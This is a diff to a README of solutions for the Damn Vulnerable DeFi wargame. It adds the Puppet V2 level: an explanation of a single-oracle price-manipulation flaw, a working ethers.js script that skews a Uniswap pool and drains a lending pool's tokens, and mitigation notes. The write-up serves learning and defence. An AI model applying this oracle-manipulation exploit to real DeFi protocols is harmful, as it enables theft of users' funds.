@@ -15,6 +15,7 @@ When contracts are used to solve challenges, they can be found under each `contr
 - [6) Selfie](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#6-selfie)
 - [7) Compromised](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#7-compromised)
 - [8) Puppet](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#8-puppet)
+- [9) Puppet V2](https://github.com/lior-abadi/damn-vulnerable-defi-solutions#9-puppet-v2)
 ⠀
 ⠀
 
@@ -407,6 +408,8 @@ This level leaves a bonus track that can be done as an easter egg! It does not c
 By taking into account the concept of offer and demand as well as knowing how does Solidity manages "decimal" numbers, this level is solved.
 
 ### Solution
+The main vulnerability in here is relying on a single oracle as a source to calculate the required amount of collateral. Also, the math within the contract makes the attack even easier.
+
 This level relies on the ```_computeOraclePrice()``` function in order to perform the estimation of the collateral needed to request a certain amount of tokens. If you are coming from languages such as Python or Javascript you won't see anything odd in here. But in Solidity, things work quite different in terms of numbers. 
 
 The mentioned function performs a division of two terms (both having 18 *decimals*). To illustrate this, we may follow this example:
@@ -467,8 +470,108 @@ The code for this exploit may look something like this:
         console.log(" ");
 
 ### Learnings - Mitigations
+- When needing to use external sources of price or information, never rely on a single oracle source. If there is no other way to do so, use trusted oracles such as Chainlink for example.
 - When performing divisions, we need to evaluate if the denominator can be in a scenario greater than the numerator and how it may impact the contract logic.
 - If we need to perform a division to use that ratio as a proportional for other number, it is advisable to perform all the multiplications first and then calculate the division in the end. On this level this could be done by combining the functions ```calculateDepositRequired``` and ```_computeOraclePrice``` in a single operation that first multiplies the ```amount``` with ```uniswapPair.balance``` performing the division by ```token.balanceOf(uniswapPair)``` in the end.
 - Doing the former suggestion does not stops anyone from going to the DEX and perform swaps in order to manipulate the price. It is a matter of liquidity also! If the token has more liquidity, it is harder to manipulate it.
 
 **Remember when on school we where taught to do "boxed divisions"? Solidity also hates the remainder!**
+  ⠀
+  ⠀
+
+## 9) Puppet V2
+
+### Catch - Hints
+You need to apply the same logic from the last level in here. Precisely, think about the end quote of the **Puppet** level.
+
+### Solution
+This contract amends the multiplication and division and performs it in a single step but it does not patch the strong dependance on a single oracle. The fact of relying on a single oracle price (Uniswap), allows an attacker to twist the balance on its favor achieving any rate of collateral of his desire.
+
+The steps to drain all the DVT tokens from the pool are the following:
+
+1) Increase the ```DVT``` balance on Uniswap by exchanging them for ```ETH``` (which also increases our ```ETH``` balance).
+2) Getting ```WETH``` by wrapping ```ETH``` within the ```WETH``` contract.
+3) Borrowing all the ```DVT``` tokens held on the Lending Pool.
+
+The script would be something like this:
+
+        // Estimating the initial amount of collateral needed to borrow.
+        let oneDVT = ethers.utils.parseEther("1");
+        let collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
+        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
+
+        // We need to drain the WETH or increase the DVT on the UniswapV2 pool in order to get DVT >>>> WETH.
+        let amountToLiquidate = ethers.utils.parseEther("10000");
+        let askedAmountOfETH = ethers.utils.parseEther("8");
+        let txPath = [this.token.address, this.weth.address];
+
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, amountToLiquidate);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            amountToLiquidate,                                           // amountOut
+            askedAmountOfETH,                                          // amountInMax
+            txPath,                                                     // path
+            attacker.address,                                           // to
+            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline
+        );
+        console.log(`Swapped ${ethers.utils.formatEther(amountToLiquidate)} DVT for ${ethers.utils.formatEther(askedAmountOfETH)}`)
+        
+        let attackerEthBalance = await ethers.provider.getBalance(attacker.address);
+        let attackerDVTBalance = await this.token.balanceOf(attacker.address);
+
+        let uniswapEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
+        let uniswapDVTBalance = await this.token.balanceOf(this.uniswapExchange.address);
+
+        console.log(" ");
+        console.log("========== ========== ==========");
+        console.log(`Attacker Balances:`);
+        console.log(`${ethers.utils.formatEther(attackerEthBalance)} ETH`);
+        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
+        console.log("========== ========== ==========")
+        console.log(" ");
+        console.log("========== ========== ==========");
+        console.log(`Uniswap Balances:`);
+        console.log(`${ethers.utils.formatEther(uniswapEthBalance)} ETH`);
+        console.log(`${ethers.utils.formatEther(uniswapDVTBalance)} DVTs`);
+        console.log("========== ========== ==========")
+        console.log(" ");
+        
+        // Swapping the new ether amount for WETH (minus a small amount to cover gas costs).
+        this.weth.connect(attacker).deposit({value: (await ethers.provider.getBalance(attacker.address)).mul(997).div(1000)});
+        let attackerWethBalance = await this.weth.balanceOf(attacker.address);
+        console.log(`The attacker now has ${ethers.utils.formatEther(attackerWethBalance)} WETH`);
+
+        // Calculating the collateral for the new token status.
+        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
+        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
+        
+        let currentPoolBalance = await this.token.balanceOf(this.lendingPool.address);
+        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(currentPoolBalance);
+        console.log(`If we get greedy, to drain the pool we need ${ethers.utils.formatEther(collateralRequired)} WETH`);
+        console.log(" ");
+
+        // Now, we can drain the pool
+        let amountToBorrow = await this.token.balanceOf(this.lendingPool.address);
+        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(amountToBorrow);
+        console.log(`In order to borrow ${ethers.utils.formatEther(amountToBorrow)} DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
+        await this.weth.connect(attacker).approve(this.lendingPool.address, amountToBorrow.mul(101).div(100)); // Allowing 1% more as a sec. coef.
+        await this.lendingPool.connect(attacker).borrow(amountToBorrow);
+
+        attackerWethBalance = await this.weth.balanceOf(attacker.address);
+        attackerDVTBalance = await this.token.balanceOf(attacker.address);
+
+        console.log(" ");
+        console.log("========== ========== ==========");
+        console.log(`Attacker Balances:`);
+        console.log(`${ethers.utils.formatEther(attackerWethBalance)} WETH`);
+        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
+        console.log("========== ========== ==========")
+        console.log(" ");   
+
+And that's it! Another pool drained!
+
+### Learnings - Mitigations
+- Same as before, prevent relying on a single oracle unless there is no other way! 
+
+**Why are we draining everything? Is there a flood?**
+
+
